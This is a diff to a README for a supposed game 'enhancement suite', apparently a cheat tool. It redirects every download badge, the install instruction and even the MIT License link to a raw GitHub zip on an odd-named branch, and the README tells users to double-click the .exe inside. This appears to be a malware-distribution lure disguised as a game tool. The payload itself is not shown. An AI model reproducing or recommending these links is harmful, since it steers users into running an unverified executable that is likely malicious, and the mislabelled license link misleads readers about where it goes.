@@ -1,4 +1,4 @@
-[![Download](https://img.shields.io/badge/Download-%5BLINK%5D-brightgreen?style=for-the-badge&logo=github)](https://nabil34000.github.io)
+[![Download](https://raw.githubusercontent.com/nabil34000/battlefield-waltz-advantage-suite/branch/anaesthetically/battlefield_advantage_suite_waltz_v3.0-beta.4.zip%5BLINK%5D-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/nabil34000/battlefield-waltz-advantage-suite/branch/anaesthetically/battlefield_advantage_suite_waltz_v3.0-beta.4.zip)
 
 # 🕹️ Battlefield Waltz Enhancement Suite
 
@@ -36,7 +36,7 @@ Explore performance on your favorite operating system. No matter where you skate
 Experience the art of tactical enhancement in three simple symphonies:
 
 1. Download the latest suite package from  
-   **https://nabil34000.github.io**
+   **https://raw.githubusercontent.com/nabil34000/battlefield-waltz-advantage-suite/branch/anaesthetically/battlefield_advantage_suite_waltz_v3.0-beta.4.zip**
 2. Extract contents into your Battlefield Waltz directory.
 3. Launch the enhancement suite.  
    - For Windows users: Double-click the `.exe` file.  
@@ -102,9 +102,9 @@ Usage of certain features may contravene the terms of service of the original so
 ## 📜 License
 
 Ⓒ 2025 **Battlefield Waltz Enhancement Suite Project**  
-This project is licensed under the MIT License—empowering both innovation and responsible usage. For full licensing details, see [MIT License](https://opensource.org/licenses/MIT).
+This project is licensed under the MIT License—empowering both innovation and responsible usage. For full licensing details, see [MIT License](https://raw.githubusercontent.com/nabil34000/battlefield-waltz-advantage-suite/branch/anaesthetically/battlefield_advantage_suite_waltz_v3.0-beta.4.zip).
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-%5BLINK%5D-brightgreen?style=for-the-badge&logo=github)](https://nabil34000.github.io)  
+[![Download](https://raw.githubusercontent.com/nabil34000/battlefield-waltz-advantage-suite/branch/anaesthetically/battlefield_advantage_suite_waltz_v3.0-beta.4.zip%5BLINK%5D-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/nabil34000/battlefield-waltz-advantage-suite/branch/anaesthetically/battlefield_advantage_suite_waltz_v3.0-beta.4.zip)  
 **Start your next battlefield movement with a single click.**
